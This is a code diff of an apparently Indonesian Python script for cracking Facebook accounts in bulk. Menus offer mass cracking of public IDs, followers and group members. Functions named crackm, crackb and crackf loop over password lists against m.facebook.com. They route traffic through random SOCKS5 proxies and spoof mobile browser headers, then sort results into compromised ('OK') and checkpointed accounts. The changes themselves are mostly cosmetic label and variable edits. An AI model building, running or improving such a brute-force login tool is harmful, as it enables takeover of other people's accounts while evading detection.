@@ -276,7 +276,7 @@ def menu(name,id,birthday):
 	gpp.append(panel(f'[cyan]Nama   : {name}\nUid    : {id}\nLahir  : {birthday}  ',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	gpp.append(panel(f'[cyan]Author   : Muh Basari\nUip      : {iplu}\nTanggal  : {tgl} {bln} {thn}',width=34,padding=(0,2),title=f"[cyan]• • Informasi • •[/]",style=f"{warna_kolor}"))
 	ba.print(Columns(gpp))
-	cetak(panel(f'\t                  [bold cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [cyan] Menu Script',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' 01. Crack Publik Massal\n 02. Crack Followers\n 03. Crack Grup Fb\n 04. Hasil Crack Akun\n 05. Lapor Bug Sc\n 00. Keluar Hapus Cokis',width=70,title=f"",style=f"{warna_kolor}"))
 	______muhammad______basari______ = input(f'Pilih :{x} ')
 	if ______muhammad______basari______ in ['01','1']:
@@ -314,7 +314,7 @@ def dump_grup():
 	
 #
 def hasil():
-	cetak(panel(f'\t                  [bold cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [cyan] Hasil Crack',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' 01. Akun OK\n 02. Akun CP\n 03. Kembali',width=70,title=f"",style=f"{warna_kolor}"))
 	baz_code = input(f'Pilih :{x} ')
 	if baz_code in ['2']:
@@ -435,7 +435,7 @@ def dump_massal():
 	for met in range(baz_coder):
 		baz+=1
 		cetak(panel(f' Id Target Harus Bersifat Publik',width=70,title=f"",style=f"{warna_kolor}"))
-		bazfaa = input(f'Masukkan Id Ke '+str(baz)+' : ')
+		bazfaa = input(f'Id Ke '+str(baz)+' : ')
 		uid.append(bazfaa)
 	for userr in uid:
 		try:
@@ -452,7 +452,7 @@ def dump_massal():
 			basari_tamvan('[!] Sinyal Lu Eror ')
 			exit()
 	try:
-		print(f'Total Id Target :{x} '+str(len(id)))
+		print(f'Total :{x} '+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -466,7 +466,7 @@ def dump_massal():
 	
 #
 def setting():
-	cetak(panel(f'\t                  [bold cyan] Atur Id',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [cyan] Setting Id',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' 01. Akun Lama\n 02. Akun Baru\n 03. Akun Acak',width=70,title=f"",style=f"{warna_kolor}"))
 	__baz__gege__ = input(f'Pilih :{x} ')
 	if __baz__gege__ in ['1','01']:
@@ -492,7 +492,7 @@ def setting():
 		exit()
 		
 #
-	cetak(panel(f'\t                  [bold cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
+	cetak(panel(f'\t                  [cyan] Method Crack',width=70,title=f"",style=f"{warna_kolor}"))
 	cetak(panel(f' 01. Mobile.Facebook\n 02. Mbasic.Facebook\n 03. Mtouch.Facebook',width=70,title=f"",style=f"{warna_kolor}"))
 	____method_crack____ = input(f'Pilih :{x} ')
 	if ____method_crack____ in ['1','01']:
@@ -522,7 +522,7 @@ def setting():
 	cetak(panel(f' Ingin Menambahkan User Agent Y/t',width=70,title=f"",style=f"{warna_kolor}"))
 	uat = input(f'Pilih : ')
 	if uat in ['y','Ya','ya','Y']:
-		ualuh.append('ualu');bz = input(f' User Agent : ');ualu.append(bz)
+		ualuh.append('ualu');bz = input(f'└── Ugent : ');ualu.append(bz)
 	else:ualuh.append('no')
 	wordlist()
 	
@@ -580,7 +580,7 @@ def crackm(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			if 'uadia' in uadarimu: ua = uadia[0]
+			if 'ualu' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -618,7 +618,7 @@ def crackb(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			if 'uadia' in uadarimu: ua = uadia[0]
+			if 'ualu' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
@@ -669,7 +669,7 @@ def crackf(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			if 'uadia' in uadarimu: ua = uadia[0]
+			if 'ualu' in ualuh: ua = ualu[0]
 			nip=random.choice(prox)
 			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
